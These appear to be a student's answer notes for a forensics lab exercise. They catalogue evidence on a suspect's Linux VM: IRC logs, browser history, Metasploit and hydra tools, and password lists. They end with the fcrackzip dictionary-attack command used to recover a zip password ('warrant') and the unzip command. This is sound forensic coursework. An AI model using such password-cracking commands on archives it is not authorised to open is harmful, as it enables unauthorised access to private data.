1. The VM is unable to boot since there isn't a bootable OS
@1445 Rebuild the vdi, take a closer look at the first time that it boots. 
we probably need to explain better

2. Puppy Linux

3. /3/home -> nefarious

4. Yes, irc log reveals accomplice

5.

6. Firefox cookies -> stuff about guns
   form history -> nerf guns
   places -> hasbro and nerg gun hacks

7. Deleted evil_plan.bmp in /3/nefarious/Documents
   /Desktop/msf3
    mozilla sqlite journal
    hydra
    password files in /3/home/nefarious




password list in /3/home/nefarious/Desktop

hydra program in /3/home/nefarious -> used to brute force remote login passwords

downloaded passwords and exploit framework (firefox downloads)

!!!! images in /3/home/nefarious/.thumbnails, definitely evidence


Took passwords.zip from home directory, used fcrackzip on it with the linux dictionary

fcrackzip -D -p /usr/share/dict/words passwords.zip 
possible pw found: warrant () 

warrant was the password that unzipped it using this command

unzip -P warrant passwords.zip  -d ./done
